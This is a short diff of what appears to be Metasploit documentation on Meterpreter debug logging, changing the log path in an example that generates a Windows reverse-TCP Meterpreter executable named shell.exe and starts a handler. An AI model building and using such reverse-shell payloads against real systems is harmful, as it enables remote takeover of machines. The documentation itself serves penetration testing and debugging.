@@ -83,7 +83,7 @@ php shell_http.php
 
 ```
 use windows/x64/meterpreter_reverse_tcp
-generate -f exe -o shell.exe MeterpreterDebugBuild=true MeterpreterDebugLogging='rpath:C:/test/foo.txt'
+generate -f exe -o shell.exe MeterpreterDebugBuild=true MeterpreterDebugLogging='rpath:C:/Windows/Temp/foo.txt'
 
 to_handler
 ```
